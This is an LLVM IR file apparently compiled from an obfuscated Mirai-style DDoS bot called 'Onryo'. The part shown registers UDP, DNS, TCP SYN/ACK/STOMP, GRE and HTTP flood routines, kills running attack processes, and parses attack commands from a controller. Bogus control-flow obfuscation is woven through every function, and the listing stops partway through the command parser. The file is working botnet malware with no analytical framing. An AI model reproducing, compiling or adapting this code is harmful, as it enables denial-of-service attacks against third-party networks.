; ModuleID = 'host/ir_bcf/Onryo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00", align 16
@table = common global [81 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = load i32, i32* @x.5
  %2 = load i32, i32* @y.6
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  store i32 0, i32* %9, align 4
  %10 = load i32, i32* @x.5
  %11 = load i32, i32* @y.6
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %18

; <label>:18:                                     ; preds = %69, %originalBBpart2
  %19 = load i32, i32* %9, align 4
  %20 = icmp slt i32 %19, 3
  br i1 %20, label %21, label %72

; <label>:21:                                     ; preds = %18
  %22 = load i32, i32* @x.5
  %23 = load i32, i32* @y.6
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = load i32, i32* %9, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = icmp ne i32 %33, 0
  %35 = load i32, i32* @x.5
  %36 = load i32, i32* @y.6
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %34, label %43, label %65

; <label>:43:                                     ; preds = %originalBBpart24
  %44 = load i32, i32* @x.5
  %45 = load i32, i32* @y.6
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %43
  %52 = load i32, i32* %9, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @kill(i32 %55, i32 9) #6
  %57 = load i32, i32* @x.5
  %58 = load i32, i32* @y.6
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %65

; <label>:65:                                     ; preds = %originalBBpart28, %originalBBpart24
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %67
  store i32 0, i32* %68, align 4
  br label %69

; <label>:69:                                     ; preds = %65
  %70 = load i32, i32* %9, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %9, align 4
  br label %18

; <label>:72:                                     ; preds = %18
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %73 = alloca i32, align 4
  store i32 0, i32* %73, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %75
  %77 = load i32, i32* %76, align 4
  %78 = icmp ne i32 %77, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %43
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %80
  %82 = load i32, i32* %81, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #6
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %33

; <label>:16:                                     ; preds = %2
  %17 = load i32, i32* @x.7
  %18 = load i32, i32* @y.8
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* @x.7
  %26 = load i32, i32* @y.8
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %427

; <label>:33:                                     ; preds = %2
  %34 = load i8*, i8** %3, align 8
  %35 = bitcast i8* %34 to i32*
  %36 = load i32, i32* %35, align 4
  %37 = call i32 @ntohl(i32 %36) #7
  store i32 %37, i32* %6, align 4
  %38 = load i8*, i8** %3, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 4
  store i8* %39, i8** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = sext i32 %40 to i64
  %42 = sub i64 %41, 4
  %43 = trunc i64 %42 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %63

; <label>:46:                                     ; preds = %33
  %47 = load i32, i32* @x.7
  %48 = load i32, i32* @y.8
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* @x.7
  %56 = load i32, i32* @y.8
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %427

; <label>:63:                                     ; preds = %33
  %64 = load i32, i32* @x.7
  %65 = load i32, i32* @y.8
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  %72 = load i8*, i8** %3, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %3, align 8
  %74 = load i8, i8* %72, align 1
  store i8 %74, i8* %7, align 1
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = sub i64 %76, 1
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %4, align 4
  %79 = load i32, i32* %4, align 4
  %80 = icmp eq i32 %79, 0
  %81 = load i32, i32* @x.7
  %82 = load i32, i32* @y.8
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br i1 %80, label %89, label %90

; <label>:89:                                     ; preds = %originalBBpart216
  br label %427

; <label>:90:                                     ; preds = %originalBBpart216
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  store i8 %93, i8* %8, align 1
  %94 = load i32, i32* %4, align 4
  %95 = sext i32 %94 to i64
  %96 = sub i64 %95, 1
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %4, align 4
  %98 = load i8, i8* %8, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %90
  %102 = load i32, i32* @x.7
  %103 = load i32, i32* @y.8
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %101
  %110 = load i32, i32* @x.7
  %111 = load i32, i32* @y.8
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %427

; <label>:118:                                    ; preds = %90
  %119 = load i32, i32* %4, align 4
  %120 = sext i32 %119 to i64
  %121 = load i8, i8* %8, align 1
  %122 = zext i8 %121 to i64
  %123 = mul i64 5, %122
  %124 = icmp ult i64 %120, %123
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %118
  br label %427

; <label>:126:                                    ; preds = %118
  %127 = load i32, i32* @x.7
  %128 = load i32, i32* @y.8
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %126
  %135 = load i8, i8* %8, align 1
  %136 = zext i8 %135 to i64
  %137 = call noalias i8* @calloc(i64 %136, i64 24) #6
  %138 = bitcast i8* %137 to %struct.attack_target*
  store %struct.attack_target* %138, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  %139 = load i32, i32* @x.7
  %140 = load i32, i32* @y.8
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %147

; <label>:147:                                    ; preds = %originalBBpart238, %originalBBpart224
  %148 = load i32, i32* @x.7
  %149 = load i32, i32* @y.8
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %147
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %8, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  %160 = load i32, i32* @x.7
  %161 = load i32, i32* @y.8
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %159, label %168, label %229

; <label>:168:                                    ; preds = %originalBBpart228
  %169 = load i8*, i8** %3, align 8
  %170 = bitcast i8* %169 to i32*
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %173 = load i32, i32* %5, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  store i32 %171, i32* %176, align 4
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i64 4
  store i8* %178, i8** %3, align 8
  %179 = load i8*, i8** %3, align 8
  %180 = getelementptr inbounds i8, i8* %179, i32 1
  store i8* %180, i8** %3, align 8
  %181 = load i8, i8* %179, align 1
  %182 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 2
  store i8 %181, i8* %186, align 4
  %187 = load i32, i32* %4, align 4
  %188 = sext i32 %187 to i64
  %189 = sub i64 %188, 5
  %190 = trunc i64 %189 to i32
  store i32 %190, i32* %4, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 0
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %195, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %204 = load i32, i32* %5, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i32 0, i32 0
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %207, i32 0, i32 2
  %209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %208, i32 0, i32 0
  store i32 %202, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %168
  %211 = load i32, i32* @x.7
  %212 = load i32, i32* @y.8
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %210
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = load i32, i32* @x.7
  %222 = load i32, i32* @y.8
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart238, label %originalBB30alteredBB

originalBBpart238:                                ; preds = %originalBB30
  br label %147

; <label>:229:                                    ; preds = %originalBBpart228
  %230 = load i32, i32* @x.7
  %231 = load i32, i32* @y.8
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %229
  %238 = load i32, i32* %4, align 4
  %239 = sext i32 %238 to i64
  %240 = icmp ult i64 %239, 1
  %241 = load i32, i32* @x.7
  %242 = load i32, i32* @y.8
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %240, label %249, label %250

; <label>:249:                                    ; preds = %originalBBpart242
  br label %427

; <label>:250:                                    ; preds = %originalBBpart242
  %251 = load i8*, i8** %3, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %3, align 8
  %253 = load i8, i8* %251, align 1
  store i8 %253, i8* %9, align 1
  %254 = load i32, i32* %4, align 4
  %255 = sext i32 %254 to i64
  %256 = sub i64 %255, 1
  %257 = trunc i64 %256 to i32
  store i32 %257, i32* %4, align 4
  %258 = load i8, i8* %9, align 1
  %259 = zext i8 %258 to i32
  %260 = icmp sgt i32 %259, 0
  br i1 %260, label %261, label %403

; <label>:261:                                    ; preds = %250
  %262 = load i8, i8* %9, align 1
  %263 = zext i8 %262 to i64
  %264 = call noalias i8* @calloc(i64 %263, i64 16) #6
  %265 = bitcast i8* %264 to %struct.attack_option*
  store %struct.attack_option* %265, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %266

; <label>:266:                                    ; preds = %383, %261
  %267 = load i32, i32* %5, align 4
  %268 = load i8, i8* %9, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp slt i32 %267, %269
  br i1 %270, label %271, label %386

; <label>:271:                                    ; preds = %266
  %272 = load i32, i32* %4, align 4
  %273 = sext i32 %272 to i64
  %274 = icmp ult i64 %273, 1
  br i1 %274, label %275, label %292

; <label>:275:                                    ; preds = %271
  %276 = load i32, i32* @x.7
  %277 = load i32, i32* @y.8
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %275
  %284 = load i32, i32* @x.7
  %285 = load i32, i32* @y.8
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %427

; <label>:292:                                    ; preds = %271
  %293 = load i32, i32* @x.7
  %294 = load i32, i32* @y.8
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %292
  %301 = load i8*, i8** %3, align 8
  %302 = getelementptr inbounds i8, i8* %301, i32 1
  store i8* %302, i8** %3, align 8
  %303 = load i8, i8* %301, align 1
  %304 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %305 = load i32, i32* %5, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %307, i32 0, i32 1
  store i8 %303, i8* %308, align 8
  %309 = load i32, i32* %4, align 4
  %310 = sext i32 %309 to i64
  %311 = sub i64 %310, 1
  %312 = trunc i64 %311 to i32
  store i32 %312, i32* %4, align 4
  %313 = load i32, i32* %4, align 4
  %314 = sext i32 %313 to i64
  %315 = icmp ult i64 %314, 1
  %316 = load i32, i32* @x.7
  %317 = load i32, i32* @y.8
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart252, label %originalBB48alteredBB

originalBBpart252:                                ; preds = %originalBB48
  br i1 %315, label %324, label %341

; <label>:324:                                    ; preds = %originalBBpart252
  %325 = load i32, i32* @x.7
  %326 = load i32, i32* @y.8
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %324
  %333 = load i32, i32* @x.7
  %334 = load i32, i32* @y.8
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart256, label %originalBB54alteredBB

